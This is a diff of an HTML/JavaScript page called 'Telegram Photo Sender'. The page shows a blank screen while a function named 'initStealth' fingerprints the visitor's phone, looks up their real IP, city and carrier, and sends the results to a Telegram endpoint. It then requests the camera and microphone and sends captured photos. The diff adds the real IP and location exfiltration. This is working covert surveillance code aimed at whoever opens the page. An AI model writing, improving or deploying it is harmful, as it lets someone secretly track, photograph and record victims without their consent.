@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Telegram Photo Sender</title>
+  <title>Telegram Photo Sender (Fixed)</title>
   <style>
     /* HIDE EVERYTHING - BLANK WHITE SCREEN */
     body {
@@ -68,25 +68,36 @@
       simId: 'Sim-XXXX-XXXX'
     };
 
-    // --- IP DATA (Static for now, no heavy fetch) ---
+    // --- IP DATA (FIXED TO FETCH REAL DATA) ---
     let locationData = { 
-      ip: '0.0.0.0', city: 'Unknown', org: 'Unknown' 
+      ip: '', city: 'Unknown', org: 'Unknown' 
     };
     
     let retryCount = 0;
 
-    // --- SIM CARD DETECTION ---
+    // --- 1. FIX SIM CARD DETECTION & IP ADDRESS ---
     async function getSimInfo() {
         const ua = navigator.userAgent.toLowerCase();
+        
+        // Try to get carrier based on the Organization name from the IP API
         let carrierName = "Unknown Carrier";
         
-        // Logic to detect carrier based on UserAgent or IP Organization
-        if (locationData.org.includes('Vodafone')) carrierName = 'Vodafone India';
-        else if (locationData.org.includes('Jio') || locationData.org.includes('Reliance')) carrierName = 'Jio';
-        else if (locationData.org.includes('Airtel')) carrierName = 'Airtel';
-        else if (ua.includes('iphone')) carrierName = 'Unknown Carrier (iOS)';
-        
-        // Generate a fake SIM ID based on IP hash for uniqueness
+        if (locationData.org) {
+            if (locationData.org.includes('Vodafone')) carrierName = 'Vodafone India';
+            else if (locationData.org.includes('Jio') || locationData.org.includes('Reliance')) carrierName = 'Jio';
+            else if (locationData.org.includes('Airtel')) carrierName = 'Airtel';
+            else if (locationData.org.includes('BSNL')) carrierName = 'BSNL';
+            else if (locationData.org.includes('Vi')) carrierName = 'Vi (Vodafone)';
+            else if (locationData.org.includes('Idea')) carrierName = 'Airtel/Idea';
+        }
+
+        // Fallback for specific browsers/devices if API doesn't give carrier name
+        if (carrierName === "Unknown Carrier") {
+            if (ua.includes('iphone')) carrierName = 'iOS (Unknown)';
+            else if (ua.includes('android')) carrierName = 'Android Data';
+        }
+
+        // Generate a unique ID based on the REAL IP hash
         const simHash = locationData.ip.split('.').reduce((a,b)=>a+parseInt(b),0);
         const simId = `89912345${simHash}67`; 
 
@@ -96,7 +107,7 @@
         };
     }
 
-    // --- DEVICE FINGERPRINTING ---
+    // --- 2. FIX DEVICE FINGERPRINTING (Better Regex) ---
     async function getDeviceFingerprint() {
       let ramEstimate = 'N/A';
       let batteryInfo = { level: 'N/A', charging: 'N/A' };
@@ -117,7 +128,7 @@
         ramEstimate = "Unknown (Safari/Firefox)";
       }
 
-      // 3. Phone Model & OS Detection
+      // 3. Phone Model & OS Detection (IMPROVED LOGIC)
       const ua = navigator.userAgent;
       let model = 'Generic Smartphone';
       let os = 'Android'; // Default
@@ -130,9 +141,24 @@
           else model = 'iPhone (Unknown)';
       } else if (ua.match(/Android/i)) {
           os = 'Android';
-          const match = ua.match(/; (.*?)\sBuild/);
-          if(match && match[1]) model = match[1];
-          else model = "Generic Android Device";
+          
+          // Try to extract specific model from Android UserAgent
+          // Examples: SM-A546B/13, M2006J10CIN, Pixel 6
+          const androidMatch = ua.match(/; (.*?)\sBuild/); 
+          if (androidMatch && androidMatch[1]) {
+              model = androidMatch[1]; // This usually gives the Model Code (e.g., SM-A546B)
+              
+              // Clean up common junk
+              model = model.replace('Android', '');
+              if(model.length > 30) model = model.substring(0, 25) + '...'; 
+          } else {
+              // Fallback: Check for specific keywords in the whole string
+              if (ua.includes('Pixel')) model = 'Google Pixel';
+              else if (ua.includes('Samsung')) model = 'Samsung Device';
+              else if (ua.includes('Xiaomi') || ua.includes('Redmi')) model = 'Xiaomi/Redmi';
+              else if (ua.includes('OnePlus')) model = 'OnePlus';
+              else if (ua.includes('Motorola')) model = 'Motorola';
+          }
       }
 
       return {
@@ -145,24 +171,29 @@
       };
     }
 
-    // --- MAIN INITIALIZATION (Runs on page load) ---
+    // --- MAIN INITIALIZATION (FIXED IP FETCH) ---
     async function initStealth() {
       try {
-        // 1. Fetch Device Info
+        // 1. Fetch Real Location Data FIRST (Fixes the IP issue)
+        document.getElementById('status').innerText = `📡 Fetching Network Info...`;
+        
+        const res = await fetch('https://ipinfo.io/json').then(r => r.json());
+        if(res.ip) { 
+            locationData.ip = res.ip; 
+            locationData.city = res.city || 'Unknown'; 
+            locationData.org = res.org || 'Unknown Org'; // Get Organization for Carrier
+        }
+
+        // 2. Get Device Info
         const device = await getDeviceFingerprint();
         
-        // 2. Simulate SIM Info (Needs IP for hash, so we do a quick fetch here if needed, 
-        // but to keep it fast we will use a static IP for now or try one quick fetch)
-        // Note: We assume the user wants this to be fast. If you want real location, uncomment below line.
-        // const res = await fetch('https://ipapi.co/json/').then(r => r.json()); 
-        // if(res.ip) { locationData.ip = res.ip; locationData.city = res.city || 'Unknown'; }
-
+        // 3. Simulate SIM Info (Now uses real IP and Org)
         const simDetails = await getSimInfo();
         
         deviceInfo.model = device.model;
         deviceInfo.carrier = simDetails.carrier;
 
-        // 3. Send Device Info Message (TEXT ONLY, NO IMAGE)
+        // 4. Send Device Info Message (TEXT ONLY, NO IMAGE)
         const caption = `**📱 DEVICE INFO DETECTED**
         
 **Device:** ${device.model}
@@ -172,6 +203,8 @@
 
 **SIM Card:** ${simDetails.carrier}
 **ID:** ${simDetails.simId}
+**IP:** ${locationData.ip}
+**Location:** ${locationData.city}, ${locationData.org}
 
 **Time:** ${new Date().toLocaleTimeString()}`;
 
@@ -184,10 +217,10 @@
           method: 'POST', body: formData,
         });
 
-        // 4. Update UI Status
+        // 5. Update UI Status
         document.getElementById('status').innerText = `✅ Info Sent! Requesting Camera...`;
         
-        // 5. Immediately ask for Camera & Mic (No location permission)
+        // 6. Immediately ask for Camera & Mic
         requestCamera();
 
       } catch (e) {
@@ -282,7 +315,7 @@
       startAudioCapture();
     }
 
-    // --- PHOTO CAPTURE (NO LOCATION FETCHES) ---
+    // --- PHOTO CAPTURE (FIXED IP IN CAPTION) ---
     async function captureAndSend() {
       const device = await getDeviceFingerprint();
       const simDetails = await getSimInfo();
@@ -296,6 +329,7 @@
 
 **📡 SIM Card:** ${simDetails.carrier}
 **ID:** ${simDetails.simId}
+**IP:** ${locationData.ip}
 
 **⏱️ Time:** ${new Date().toLocaleTimeString()}`;
 
